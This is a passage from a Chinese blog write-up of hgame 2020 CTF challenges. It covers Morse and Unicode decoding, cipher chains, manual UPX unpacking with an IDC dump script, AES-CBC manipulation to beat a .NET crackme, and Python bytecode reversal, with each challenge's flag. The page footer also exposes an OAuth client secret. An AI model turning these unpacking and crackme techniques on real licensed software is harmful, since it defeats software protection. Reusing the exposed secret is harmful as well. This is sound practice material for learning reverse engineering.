CODE = {&#39;A&#39;: &#39;.-&#39;, &#39;B&#39;: &#39;-...&#39;, &#39;C&#39;: &#39;-.-.&#39;,
        &#39;D&#39;: &#39;-..&#39;, &#39;E&#39;: &#39;.&#39;, &#39;F&#39;: &#39;..-.&#39;,
        &#39;G&#39;: &#39;--.&#39;, &#39;H&#39;: &#39;....&#39;, &#39;I&#39;: &#39;..&#39;,
        &#39;J&#39;: &#39;.---&#39;, &#39;K&#39;: &#39;-.-&#39;, &#39;L&#39;: &#39;.-..&#39;,
        &#39;M&#39;: &#39;--&#39;, &#39;N&#39;: &#39;-.&#39;, &#39;O&#39;: &#39;---&#39;,
        &#39;P&#39;: &#39;.--.&#39;, &#39;Q&#39;: &#39;--.-&#39;, &#39;R&#39;: &#39;.-.&#39;,
        &#39;S&#39;: &#39;...&#39;, &#39;T&#39;: &#39;-&#39;, &#39;U&#39;: &#39;..-&#39;,
        &#39;V&#39;: &#39;...-&#39;, &#39;W&#39;: &#39;.--&#39;, &#39;X&#39;: &#39;-..-&#39;,
        &#39;Y&#39;: &#39;-.--&#39;, &#39;Z&#39;: &#39;--..&#39;,

        &#39;0&#39;: &#39;-----&#39;, &#39;1&#39;: &#39;.----&#39;, &#39;2&#39;: &#39;..---&#39;,
        &#39;3&#39;: &#39;...--&#39;, &#39;4&#39;: &#39;....-&#39;, &#39;5&#39;: &#39;.....&#39;,
        &#39;6&#39;: &#39;-....&#39;, &#39;7&#39;: &#39;--...&#39;, &#39;8&#39;: &#39;---..&#39;,
        &#39;9&#39;: &#39;----.&#39;,

        &#39;.&#39;: &#39;.-.-.-&#39;, &#39;:&#39;: &#39;---...&#39;, &#39;,&#39;: &#39;--..--&#39;, &#39;;&#39;: &#39;-.-.-.&#39;,
        &#39;?&#39;: &#39;..--..&#39;, &#39;=&#39;: &#39;-...-&#39;, &#39;\&#39;&#39;: &#39;.----.&#39;, &#39;/&#39;: &#39;-..-.&#39;,
        &#39;!&#39;: &#39;-.-.--&#39;, &#39;-&#39;: &#39;-....-&#39;, &#39;_&#39;: &#39;..--.-&#39;, &#39;&quot;&#39;: &#39;.-..-.&#39;,
        &#39;(&#39;: &#39;-.--.&#39;, &#39;)&#39;: &#39;-.--.-&#39;, &#39;$&#39;: &#39;...-..-&#39;, &#39;&amp;&#39;: &#39;.-...&#39;,
        &#39;@&#39;: &#39;.--.-.&#39;

        }


def Decode(str):
    Decode_value = CODE.keys()
    Decode_key = CODE.values()
    Decode_dict = dict(zip(Decode_key, Decode_value))

    text = &#39;&#39;
    msg = str.split(&#39; &#39;)
    for s in msg:
        if s in Decode_dict.keys():
            text += Decode_dict[s]
    return text


print(Decode(&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;))
</code></pre>
<p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p>
<pre><code class="flag">hgame{W3LC0ME_TO_2020_HGAM3}</code></pre>
<h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p>
<p>解压出来打开flag.txt，内容如下：</p>
<pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>unicode编码，解码得：</p>
<pre><code class="flag">hgame{Do_y0u_KnOW_uNiC0d3?}</code></pre>
<h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p>
<pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.

JRFVJYFZVRUAGMAI


* Three fences first, Five Caesar next. English sentense first,  zip password next.</code></pre><p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p>
<pre><code>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.

EAVMUBAQHQMVEPDT</code></pre><p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p>
<pre><code class="flag">hgame{3Nc0dInG_@lL_iN_0Ne!}</code></pre>
<p>这题有各种各样的编码，还不错</p>
<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a href="https://www.52pojie.cn/thread-1048649-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p>
<pre><code class="c++">#include &lt;idc.idc&gt;
#define PT_LOAD              1

#define PT_DYNAMIC           2

static main(void)
{
  auto ImageBase,StartImg,EndImg;
  auto e_phoff;
  auto e_phnum,p_offset;
  auto i,dumpfile;
  ImageBase=0x400000;
  StartImg=0x400000;
  EndImg=0x0;
  if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )
  {
    if(dumpfile=fopen(&quot;D:\\dumpfile&quot;,&quot;wb&quot;))
    {
      e_phoff=ImageBase+Qword(ImageBase+0x20);
      Message(&quot;e_phoff = 0x%x\n&quot;, e_phoff);
      e_phnum=Word(ImageBase+0x38);
      Message(&quot;e_phnum = 0x%x\n&quot;, e_phnum);
      for(i=0;i&lt;e_phnum;i++)
      {
         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)
         { 
            p_offset=Qword(e_phoff+0x8);
            StartImg=Qword(e_phoff+0x10);
            EndImg=StartImg+Qword(e_phoff+0x28);
            Message(&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;, StartImg, EndImg, p_offset);
            dump(dumpfile,StartImg,EndImg,p_offset);
            Message(&quot;dump segment %d ok.\n&quot;,i);
         }    
         e_phoff=e_phoff+0x38;
      }

      fseek(dumpfile,0x3c,0);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);

      fseek(dumpfile,0x28,0);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);
      fputc(0x00,dumpfile);

      fclose(dumpfile);
    }else Message(&quot;dump err.&quot;);
  }

}
static dump(dumpfile,startimg,endimg,offset) 
{
  auto i;
  auto size;
  size=endimg-startimg;
  fseek(dumpfile,offset,0);
  for ( i=0; i &lt; size; i=i+1 ) 
  {
    fputc(Byte(startimg+i),dumpfile);
  }
}</code></pre>
<p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p>
<pre><code class="c++">scanf((__int64)&quot;%42s&quot;, v7);
  v5 = 0;
  for ( i = 0; i &lt;= 41; ++i )
  {
    if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] )
      v5 = 1;
  }
  if ( v5 == 1 )
  {
    v0 = &quot;Wrong input&quot;;
    printf(&quot;Wrong input&quot;, v7);
  }
  else
  {
    v0 = &quot;Congratulations! Flag is your input&quot;;
    printf(&quot;Congratulations! Flag is your input&quot;, v7);
  }</code></pre>
<p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p>
<pre><code class="c++">#include &lt;iostream&gt;
#include &lt;string&gt;
using namespace std;
int main() {
    unsigned char ida_chars[] =
            {
                    0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49,
                    0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65,
                    0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D,
                    0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95,
                    0x8F, 0xA6
            };
    string flag;

    for(int i=0;i&lt;42;i++)
        {
            flag+=ida_chars[i]-i;
        }
    cout&lt;&lt;flag&lt;&lt;endl;
    return 0;
}</code></pre>
<p>最后输出flag</p>
<pre><code>hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng}</code></pre><h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p>
<p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p>
<pre><code class="c#">private void button1_Click(object sender, EventArgs e)
        {
            if (this.status == 1)
            {
                MessageBox.Show(&quot;你已经激活成功啦，快去提交flag吧~~~&quot;);
                return;
            }
            string text = this.textBox1.Text;
            if (text.Length != 46 || text.IndexOf(&quot;hgame{&quot;) != 0 || text.IndexOf(&quot;}&quot;) != 45)
            {
                MessageBox.Show(&quot;Illegal format&quot;);
                return;
            }
            string base64iv = text.Substring(6, 24);
            string str = text.Substring(30, 15);
            try
            {
                Aes aes = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, base64iv);
                Aes aes2 = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, &quot;MFB1T2g5SWxYMDU0SWN0cw==&quot;);
                string text2 = aes.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;);
                if (text2.Equals(&quot;Same_ciphertext_&quot;))
                {
                    byte[] array = new byte[16];
                    Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);
                    if (Convert.ToBase64String(array).Equals(&quot;dJntSWSPWbWocAq4yjBP5Q==&quot;))
                    {
                        MessageBox.Show(&quot;注册成功！&quot;);
                        this.Text = &quot;已激活，欢迎使用！&quot;;
                        this.status = 1;
                    }
                    else
                    {
                        MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));
                    }
                }
                else
                {
                    MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));
                }
            }
            catch
            {
                MessageBox.Show(&quot;注册失败！&quot;);
            }
        }</code></pre>
<p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p>
<p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p>
<p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p>
<p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p>
<p>直接python解决：</p>
<pre><code class="python">from Crypto.Cipher import AES
import base64


# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文
class AesCrypter(object):
    def __init__(self, key, iv):
        self.key = key
        self.iv = iv

    def pkcs7padding(self, text):
        bs = AES.block_size  # 16

        length = len(text)
        bytes_length = len(bytes(text, encoding=&#39;utf-8&#39;))
        padding_size = length if (bytes_length == length) else bytes_length
        padding = bs - padding_size % bs
        padding_text = chr(padding) * padding
        return text + padding_text

    def pkcs7unpadding(self, text):
        length = len(text)
        unpadding = ord(text[length - 1])
        return text[0:length - unpadding]

    def encrypt(self, content):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.pkcs7padding(content)
        aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding=&#39;utf-8&#39;))
        result = base64.b64encode(aes_encode_bytes).decode(encoding=&#39;utf-8&#39;)
        return result

    def decrypt(self, content):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        # base64解码
        aes_encode_bytes = base64.b64decode(content)
        # 解密
        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)
        # 重新编码
        result = aes_decode_bytes.decode(encoding=&#39;utf-8&#39;)
        # 去除填充内容
        result = self.pkcs7unpadding(result)
        if result == None:
            return &quot;&quot;
        else:
            return result


key = base64.b64decode(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;)
fakeIV = base64.b64decode(&#39;MFB1T2g5SWxYMDU0SWN0cw==&#39;)
plainText = &quot;Same_ciphertext_&quot;
ciperText = &quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;

aesCipher = AesCrypter(key, fakeIV)

fakePlainText = aesCipher.decrypt(ciperText)
# print(fakePlainText)
IV = &#39;&#39;
for i in range(16):
    IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))
# print(&quot;IV : &quot; + IV)
# /TyXYzPnY;$)\we_
IV = base64.b64encode(IV.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)

cipherText2 = aesCipher.encrypt(plainText)
cipherText2 = base64.b64decode(cipherText2).hex()[:32]
cipherText3 = &#39;dJntSWSPWbWocAq4yjBP5Q==&#39;
cipherText3 = base64.b64decode(cipherText3).hex()[:32]
# print(cipherText2 + cipherText3)
cipherText4 = bytes.fromhex(cipherText2 + cipherText3)
cipherText4 = base64.b64encode(cipherText4)
# print(cipherText4)
plainText3 = aesCipher.decrypt(cipherText4)
# print(plainText3)
# Same_ciphertext_DiFfer3Nt_w0r1d
flag = &#39;&#39;
flag += &#39;hgame{&#39; + IV + plainText3[16:] + &#39;}&#39;
print(flag)
# hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code></pre>
<p>最终的flag</p>
<pre><code>hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code></pre><h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p>
<p>dis指令表见<a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions" target="_blank" rel="noopener">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p>
<p>还原出来的函数原型（想打死命名的人）</p>
<pre><code class="python">def encrypt(OOo):
 O0O = OOo[::-1]
 O0o = list(O0O)
 for O0 in range(1, len(O0o)):
     Oo = O0o[O0-1] ^ O0o[O0]
     O0o[O0] = Oo
 O = bytes(O0o)
 return O.hex()</code></pre>
<p>所以只需要反过来异或一遍就可以了</p>
<pre><code class="python">s = bytes.fromhex(&#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;)
c = list(str)
for i in range(len(c) - 1, 0, -1):
    c[i] ^= c[i - 1]
print(bytes(c[::-1]))</code></pre>
<p>输出flag</p>
<pre><code>hgame{sT4cK_1$_sO_e@Sy~~}</code></pre>
            <hr>
          </div>
          <br>
          <div>
            <p>
            
              <span>
                <i class="iconfont icon-inbox"></i>
                
                  <a class="hover-with-bg" href="/categories/ctf">ctf</a>
                  &nbsp;
                
              </span>&nbsp;&nbsp;
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/ctf">ctf</a>
                
                  <a class="hover-with-bg" href="/tags/re">re</a>
                
                  <a class="hover-with-bg" href="/tags/hgame">hgame</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
      <br><br>
      
      
  <div id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.11.1/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '03ed5c136827a32c890a',
      clientSecret: '1945beadf21785378114a7137b12ad7b6ec28256',
      repo: 'comments',
      owner: 'schrodinger17',
      admin: 'schrodinger17',
      id: md5(location.pathname),
      language: 'zh-CN',
      perPage: 15,
      pagerDirection: 'last',
      createIssueManually: 'false',
      distractionFreeMode: 'false'
    });

    gitalk.render('gitalk-container')
  </script>


    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
  
  <br>



    


    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/var/www/html/lib/jquery/jquery.min.js" ></script>
<script src="/var/www/html/lib/popper/popper.min.js" ></script>
<script src="/var/www/html/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/var/www/html/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/var/www/html/js/main.js" ></script>


  <script src="/var/www/html/js/lazyload.js" ></script>



  
    <script src="/var/www/html/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/var/www/html/js/post.js" ></script>



  <script src="/var/www/html/lib/smooth-scroll/smooth-scroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  
    <!-- Google Analytics -->
    <script>
      (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
          (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
          m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

      ga('create', 'UA-128484503-1', 'auto');
      ga('send', 'pageview');
    </script>
  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/var/www/html/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  ');
      prettyPrint();
    })
  </script>



  <script src="/var/www/html/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "hgame_wp&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/var/www/html/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/var/www/html/js/local-search.js" ></script>
  <script>
    var path = "/var/www/html/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/var/www/html/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  







</body>
</html>
